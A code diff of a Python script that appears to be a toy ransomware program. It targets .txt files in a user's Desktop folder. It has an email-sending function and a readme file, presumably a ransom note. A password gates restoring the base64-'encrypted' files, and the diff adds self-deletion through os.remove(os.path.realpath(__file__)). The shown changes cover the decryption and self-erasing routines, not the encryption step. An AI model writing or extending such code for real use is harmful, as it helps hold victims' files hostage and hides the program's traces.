@@ -53,9 +53,9 @@ def email(textsend):
 
 # delete function
 def delete():
-    # delete decodeur.py
+    # auto delete
     try:
-        os.remove("/Users/" + os.getlogin() + "/Desktop/dossier/decodeur.py")
+        os.remove(os.path.realpath(__file__))
     except:
         pass
     # delete readme.txt
@@ -126,12 +126,23 @@ if args.d:
         exit()
     password = input('password for decrypte your txt files: ')  # password request
     if password == realpass:  # Verification of the password
+        # open all file .txt
         for element in os.listdir("/Users/" + os.getlogin() + "/Desktop/dossier/"):
             if element.endswith('.txt') and element != 'readme.txt':
                 file = open("/Users/" + os.getlogin() + "/Desktop/dossier/" + element, 'r')
-                newtext = decode(str(file.read()))
+                oldtext = str(file.read())  # read the file
+                # remove car if is not in bas64 key
+                newtext = ''
+                for car in oldtext:
+                    if car in base64:
+                        newtext += car
+                    else:
+                        car = ''
+                        newtext += car
+                newtextdecod = decode(newtext)  # decode text with all car in base64
+                # Write in file decrypted text and close file
                 file = open("/Users/" + os.getlogin() + "/Desktop/dossier/" + element, 'w')
-                file.write(newtext)
+                file.write(newtextdecod)
                 file.close()
             else:
                 pass
